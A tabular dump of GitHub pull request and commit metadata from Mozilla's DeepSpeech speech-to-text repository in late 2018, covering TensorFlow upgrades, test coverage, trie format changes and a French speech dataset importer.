2866,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1e7244c6c6d63bd1a3610cd116b41064edbf2ed,"Merge pull request #1614 from lissyx/remove-base-maybedownload

Remove deprecased tensorflow.contrib.learn.python.learn.datasets.base…"
2867,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4daf1bf9471d38738eadc2b6901ae3b3ddb1a564,Add single shot inference test coverage
2868,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b8b46ec9570e073ea5686baede615c0c8854b49,"Fix one shot inference

Fixes #1612"
2869,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9334122a6f25cfe790f9223ff517599d0c7265d,"Merge pull request #1615 from lissyx/one-shot-infer-fix-overlappingwindow

Add single shot inference test coverage"
2870,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d2c0e27f74d7ca731c34ed7a5d0409f83306556,Update trie file to v2
2871,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5465aa0176d59a5db6df3c2cf4799592e3d4644f,"Merge pull request #1617 from lissyx/update-trie-v2

Update trie file to v2"
2872,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97a46ba6e523881bb99882f477b1a3a4e12b1ebc,Bump to v0.2.1-alpha.2
2873,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1619,1619,Fix fallout from stricter YAML parser,,lissyx,1645737,2018-10-02T16:42:47Z,COLLABORATOR,True,4,4,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61a39c0a0ac19a3b1053b64ee2e8b95a2df8614e,Fix fallout from stricter YAML parser
2874,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1618,1618,Bump to v0.2.1-alpha.2,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-10-02T15:21:35Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97a46ba6e523881bb99882f477b1a3a4e12b1ebc,Bump to v0.2.1-alpha.2
2875,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1617,1617,Update trie file to v2,,lissyx,1645737,2018-10-02T14:26:26Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d2c0e27f74d7ca731c34ed7a5d0409f83306556,Update trie file to v2
2876,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1616,1616,Add single shot inference test coverage,,lissyx,1645737,2018-10-02T12:08:26Z,COLLABORATOR,False,104,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6701e992190a9244e93bee8d4bf198f6513b30f,Add single shot inference test coverage
2877,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1615,1615,Add single shot inference test coverage,,lissyx,1645737,2018-10-02T10:40:24Z,COLLABORATOR,True,119,5,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4daf1bf9471d38738eadc2b6901ae3b3ddb1a564,Add single shot inference test coverage
2878,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1615,1615,Add single shot inference test coverage,,lissyx,1645737,2018-10-02T10:40:24Z,COLLABORATOR,True,119,5,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b8b46ec9570e073ea5686baede615c0c8854b49,"Fix one shot inference

Fixes #1612"
2879,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1614,1614,Remove deprecased tensorflow.contrib.learn.python.learn.datasets.base…,"….maybe_download

Fixes #1531
Fixes #1477",lissyx,1645737,2018-10-02T08:38:56Z,COLLABORATOR,True,47,38,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94b8c5c1a3efefc0049264eae62ed4b9e6d2d503,"Remove deprecased tensorflow.contrib.learn.python.learn.datasets.base.maybe_download

Fixes #1531
Fixes #1477"
2880,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1611,1611,Fix docstrings that were being missed by Sphinx,,daanzu,4319503,2018-10-01T14:10:36Z,CONTRIBUTOR,True,23,23,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06d4379994452e7eb72c839508f185b2ebc32b86,Fix docstrings that were being missed by Sphinx
2881,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1610,1610,Change TRIE format,,lissyx,1645737,2018-10-01T13:39:42Z,COLLABORATOR,True,62,17,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c5e031b1f5863da158e864bbb35383bb20130c7,Change TRIE format
2882,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1608,1608,Length normalization with exp=0.7,Just getting a build to test with.,reuben,477142,2018-09-29T14:00:19Z,MEMBER,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,043c284c6c5a073a61b5586e62d85db6973752fe,Length normalization with exp=0.7
2883,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1604,1604,Switch to stable TensorFlow r1.11,,lissyx,1645737,2018-09-28T03:22:13Z,COLLABORATOR,True,23,23,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d0ef5794670baf7b5a8d9e43c615c7452567c78,Switch to stable TensorFlow r1.11
2884,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1603,1603,Fix missing field in struct copy,Fixes #1602 #1563 ,lissyx,1645737,2018-09-27T12:41:17Z,COLLABORATOR,True,12,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25ed3cb31e2227bf68650a9fc27059e377bf89a9,"Fix missing field in struct copy

Fixes #1602, #1563"
2885,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1600,1600,Fixed a mismatched array new and delete,,kdavis-mozilla,12054740,2018-09-27T09:39:43Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e1d7d004b300da96defd105885e94e52f1fc463,Fixed mismatched array new and delete
2886,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1599,1599,setup training_speech importer (see #1576),"importer for https://github.com/mozilla/DeepSpeech/issues/1576

Produces 3 `<target_dir>/ts_<ARCHIVE_NAME>_(dev|train|test).csv`  files

containing respectively

```
$ wc -l <target_dir>/ts_2018-09-28_fr*          
   5603 <target_dir>/ts_2018-09-28_fr_FR_dev.csv
   5603 <target_dir>/ts_2018-09-28_fr_FR_test.csv
  44811 <target_dir>/ts_2018-09-28_fr_FR_train.csv
  56017 total

```

and look like:
```
$ head -n 5 <target_dir>/training_speech_2018-09-28_fr_FR_*  
==> <target_dir>/ts_2018-09-28_fr_FR_dev.csv <==
wav_filename,wav_filesize,transcript
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0004.wav,219564,aussitôt comme d'habitude encore la plate forme du fort saint jean s'était couverte de curieux
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0019.wav,161868,qu'est il donc arrivé et pourquoi cet air de tristesse répandu sur tout votre bord
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0029.wav,49004,il est mort
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0040.wav,202828,après une longue conversation avec le commandant du port le capitaine leclère quitta naples fort agité

==> <target_dir>/ts_2018-09-28_fr_FR_test.csv <==
wav_filename,wav_filesize,transcript
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0001.wav,113836,chapitre un marseille l'arrivée
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0018.wav,104652,ah c'est vous dantès cria l'homme à la barque
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0028.wav,48172,il est mort
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0039.wav,123436,mon dieu monsieur de la façon la plus imprévue

==> <target_dir>/training_speech_2018-09-28_fr_FR_train.csv <==
wav_filename,wav_filesize,transcript
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0006.wav,105868,cependant ce bâtiment s'avançait
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0007.wav,282252,il avait heureusement franchi le détroit que quelque secousse volcanique a creusé entre l'île de calasareigne et l'île de jaros
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0009.wav,269708,néanmoins les experts en navigation reconnaissaient que si un accident était arrivé ce ne pouvait être au bâtiment lui même
<target_dir>/ts_2018-09-28_fr_FR/LeComteDeMonteCristoT1Chap1_0010.wav,156044,car il s'avançait dans toutes les conditions d'un navire parfaitement gouverné
...
```

Resulting alphabet is :

count | letter
------- | -----
 819470 | (space)
 551347 | e
 291556 | a
 278839 | s
 272008 | i
 258967 | t
 256397 | n
 253424 | r
 240781 | u
 218671 | o
 194406 | l
 134443 | d
 127131 | m
 116889 | c
  99572 | p
  75733 | v
  60234 | é
  53195 | '
  44553 | q
  40867 | f
  35339 | h
  35267 | b
  31629 | g
  27206 | j
  20068 | à
  14368 | x
  13043 | z
  12243 | è
   9974 | y
   8098 | ê
   3442 | ç
   2638 | â
   2464 | î
   2083 | ô
   1796 | û
   1494 | ù
   1208 | œ
     245 | ï
     156 | w
     136 | k
       45 | ü
       35 | ë
         2 | æ
",nicolaspanel,2500584,2018-09-27T07:38:56Z,CONTRIBUTOR,True,103,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,baf962471493da2742dd15eafda8d4b6c9073936,setup training_speech importer (see #1576)
2887,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1596,1596,Bump to v0.2.1-alpha.1,,lissyx,1645737,2018-09-26T16:47:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff470eab5ba7cb9d952c7a5323005de8d1754e17,Bump to v0.2.1-alpha.1
2888,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1595,1595,Enforce same sox options as libsox for C++ client,Fixes #1594,lissyx,1645737,2018-09-26T15:37:11Z,COLLABORATOR,True,15,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1362b50bfbf2b51423a9fbcad40e161a002a53b3,"Enforce same sox options as libsox for C++ client

Fixes #1594"
2889,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1591,1591,Bump to v0.2.1-alpha.0,,lissyx,1645737,2018-09-26T09:12:08Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fd98fc9bdfbbcaefb5f8f7fa9a15c0462ed4803,Bump to v0.2.1-alpha.0
2890,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1589,1589,Move remaining TensorFlow r1.6 to r1.11,,lissyx,1645737,2018-09-25T15:10:42Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34564ad48c2da3337f05a57fc9798a6e73819b71,Move remaining TensorFlow r1.6 to r1.11
2891,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1582,1582,Adding TaskCluster testing of docker build,Fixes #1578 ,lissyx,1645737,2018-09-25T05:25:36Z,COLLABORATOR,True,107,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6cf456fdb1f3b781a73322c4af6dbc64538f0636,Adding TaskCluster testing of docker build
2892,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1582,1582,Adding TaskCluster testing of docker build,Fixes #1578 ,lissyx,1645737,2018-09-25T05:25:36Z,COLLABORATOR,True,107,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0a9415ee98d786b6c3b6c65ac488f02d0257fb6,Update Dockerfile to TensorFlow r1.11
2893,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1582,1582,Adding TaskCluster testing of docker build,Fixes #1578 ,lissyx,1645737,2018-09-25T05:25:36Z,COLLABORATOR,True,107,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1eb176bf503b98e12d4bc504498ca123cd39a8e1,Move to upstream TensorFlow for Docker
2894,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1580,1580,Tf r1.11 arm+gcc72,,lissyx,1645737,2018-09-24T10:13:02Z,COLLABORATOR,False,71,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6faf26b540292ef01c95b26f09f527d003241b05,Update to TensorFlow r1.11
2895,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1580,1580,Tf r1.11 arm+gcc72,,lissyx,1645737,2018-09-24T10:13:02Z,COLLABORATOR,False,71,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f539d617992d45a07123d351c28cf117b57d4f1,Switch to temporary TensorFlow r1.11 artifacts
2896,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1580,1580,Tf r1.11 arm+gcc72,,lissyx,1645737,2018-09-24T10:13:02Z,COLLABORATOR,False,71,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a82a60b42504e31d20bdcef608499f0ba340d8a,Try use GCC 7.2
2897,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1580,1580,Tf r1.11 arm+gcc72,,lissyx,1645737,2018-09-24T10:13:02Z,COLLABORATOR,False,71,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,138e5de4dea2353313b16b1860c0f47ebe22a010,version
2898,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1580,1580,Tf r1.11 arm+gcc72,,lissyx,1645737,2018-09-24T10:13:02Z,COLLABORATOR,False,71,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a09ded9e28fd8d9016ca2908c4995de7990c6f2c,Hack
2899,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1577,1577,Tf r1.11,Fixes #1572 ,lissyx,1645737,2018-09-24T05:02:09Z,COLLABORATOR,True,72,65,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e0945e43025898e1b67f0d7aae474afb4a0dd7b,Update to TensorFlow r1.11
2900,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1571,1571,Update TensorFlow master artifacts,,lissyx,1645737,2018-09-21T05:38:32Z,COLLABORATOR,True,19,19,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed039d0e597af2c94d85cd684531a86356266de9,Update TensorFlow master artifacts
2901,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1571,1571,Update TensorFlow master artifacts,,lissyx,1645737,2018-09-21T05:38:32Z,COLLABORATOR,True,19,19,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,897d945ccc27272558c0bc60e4c664462aaafabc,Update TensorFlow version
2902,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1569,1569,Update tf master,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-20T16:11:55Z,COLLABORATOR,True,47,428,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c60a736a198df583ca9f801870c29af9e5cd2a4,Update prod tests expected output for v0.2 model
2903,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1569,1569,Update tf master,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-20T16:11:55Z,COLLABORATOR,True,47,428,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04b7f9684ebc2acc679331b21959738e752bca04,"Merge pull request #1566 from mozilla/prod-tests

Update prod tests expected output for v0.2 model"
2904,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1569,1569,Update tf master,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-20T16:11:55Z,COLLABORATOR,True,47,428,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3dad37eb05153cb935183f26e796a1437812d9af,Remove AOT
2905,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1569,1569,Update tf master,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-20T16:11:55Z,COLLABORATOR,True,47,428,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b66535d2ac2616bc237e7a8bda01105a33fb9ef,"Merge pull request #1564 from lissyx/remove-aot

Remove AOT"
2906,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1569,1569,Update tf master,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-20T16:11:55Z,COLLABORATOR,True,47,428,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9494006058732ee8579da7f2da6d1c97de6998fe,Merge remote-tracking branch 'upstream/master' into update-tf-master
2907,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1567,1567,Tf master 20180917,,lissyx,1645737,2018-09-20T12:32:09Z,COLLABORATOR,True,68,62,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c2b652347f0d129ac848b5392182e509d0df9e9,Move to TensorFlow master 20180917
2908,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1567,1567,Tf master 20180917,,lissyx,1645737,2018-09-20T12:32:09Z,COLLABORATOR,True,68,62,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ad89c85ecd357828c82412bcb813fed7a71651f,Update expected TensorFlow
2909,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1567,1567,Tf master 20180917,,lissyx,1645737,2018-09-20T12:32:09Z,COLLABORATOR,True,68,62,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ea2a84fc7ae2d4d375c2d0279043471495bb764,Change double_conversion namespace
2910,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1567,1567,Tf master 20180917,,lissyx,1645737,2018-09-20T12:32:09Z,COLLABORATOR,True,68,62,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64ae266bfceaae7c29f0c317d310bcfe4f3b9fad,Add missing ops
2911,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1567,1567,Tf master 20180917,,lissyx,1645737,2018-09-20T12:32:09Z,COLLABORATOR,True,68,62,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8561b9f794ff08076e0991af671f0383421b0066,Upgrade TensorFlow
2912,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1566,1566,Update prod tests expected output for v0.2 model,,reuben,477142,2018-09-20T12:21:17Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c60a736a198df583ca9f801870c29af9e5cd2a4,Update prod tests expected output for v0.2 model
2913,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1564,1564,Remove AOT,,lissyx,1645737,2018-09-20T11:05:37Z,COLLABORATOR,True,45,426,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3dad37eb05153cb935183f26e796a1437812d9af,Remove AOT
2914,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,44e502e236d676dfcdb3068f6a6d9d1a9d644dd1,Feature caching
2915,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25a9e76afcf8aafe17bb77ab90ea25ffdfb7ec84,Support relative paths in CSVs
2916,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,778f5deb9d218bfc7cbb204c3030a506036a4bf3,Fix export graph
2917,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cb86e7e1915194fed54b6bd256781e770747685c,Update language model to a trie-based LM created from the LibriSpeech LM corpus
2918,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,799baf1f990af2e6b600575a07780f192b6dbae4,Fix parameter inference from model shape
2919,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f9d960fd284902b2819569e38bca10c41fd5064,Strip output before testing correctness in inference tests
2920,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9946fddabcc1e465ea9f5e5aed6b574ad5fce5d,"Merge pull request #1543 from mozilla/update_lm

Update language model to a trie-based LM created from the LibriSpeech LM corpus"
2921,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dba8e34cba53d362a845164fc2a06bae8ec9325,"Merge pull request #1532 from mozilla/feature-caching-clean

Feature caching"
2922,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3663bca7e02e36b158930e2095c6414dec3dabdd,Update hyperparams from trained model
2923,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47d3dec4fefca0728dd67224084aa8528d76477e,"Fixed #1549, updated client hyperparams"
2924,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,acc5e733c5c68e389a5f42fb5a22b2554b0a891d,"Fixed #1551, updated Readme's to 0.2.0"
2925,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,732b8920fe70a1fd3834235501359395cd459925,Add CPP artifact deps
2926,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7edc4800b2a08634399601971a391ac8560d1eb6,"Merge pull request #1553 from lissyx/add-cpp-packages

Add CPP artifact deps"
2927,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa0b54d3600daf36e1abed86d168b49ab0801dca,"Merge pull request #1548 from mozilla/update-hparams

Update hyperparams from trained model"
2928,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93db786c20b7aa520f40e7c934aed8aec806841d,"Merge pull request #1550 from mozilla/issue1549

Fixed #1549, updated client hyperparams"
